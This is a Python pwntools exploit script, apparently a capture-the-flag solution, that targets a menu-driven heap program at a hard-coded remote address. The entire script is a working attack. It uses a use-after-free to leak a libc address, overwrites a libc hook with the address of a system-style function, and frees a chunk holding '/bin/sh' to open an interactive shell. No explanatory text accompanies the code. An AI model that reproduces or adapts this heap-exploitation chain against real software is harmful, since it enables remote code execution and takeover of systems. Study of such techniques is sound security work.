from pwn import *
'''
  realloc trick - UAF
'''
s = remote('13.124.157.141',31337)
def team(length,dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('length :')
  s.sendline(str(length))
  s.recvuntil('Description :')
  s.send(dat)
def del_team(index): 
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil("Index :")
  s.sendline(str(index))
def enter_team(index):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil("Index :")
  s.sendline(str(index))
def add_mem(length, src):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('Number of employment :')
  s.sendline(str(length))
  for i in range(0,len(src)):
    s.recvuntil('Name :')
    s.send(src[i]["name"])
    s.recvuntil('Description :')
    s.send(src[i]["script"])
def del_mem(index):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil("Index :")
  s.sendline(str(index))
def view():
  s.recvuntil('>')
  s.sendline('3')
def edit_mem(index,dat):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil("Index :")
  s.sendline(str(index))
  s.recvuntil('Description :')
  s.send(dat)
def out():
  s.recvuntil('>')
  s.sendline('5')
s.recvuntil('>')
s.send('1\n')
s.send('1\n')
s.recvuntil('length :')
s.send("8\n")
s.recvuntil('Description :')
s.send("A"*0x8)
enter_team(0)
a = {"name":"A","script":"A"}
add_mem(2,[a,a])
del_mem(0)
add_mem(1,[a])
view()
libc = u64(s.recvuntil('1.')[-8:-2]+'\x00\x00') - 0x3c4b41
log.info("LIBC : 0x%x"%libc)
s.recvuntil('>')
s.sendline('1')
s.recvuntil('Number of employment :')
s.sendline('253')
out()
team(24,p64(libc+0x3c67a8))
enter_team(0)
edit_mem(0,p64(libc+0x45390))
fake = {"name":"1234","script":"/bin/sh\x00"}
add_mem(1,[fake])
del_mem(3)
s.interactive()
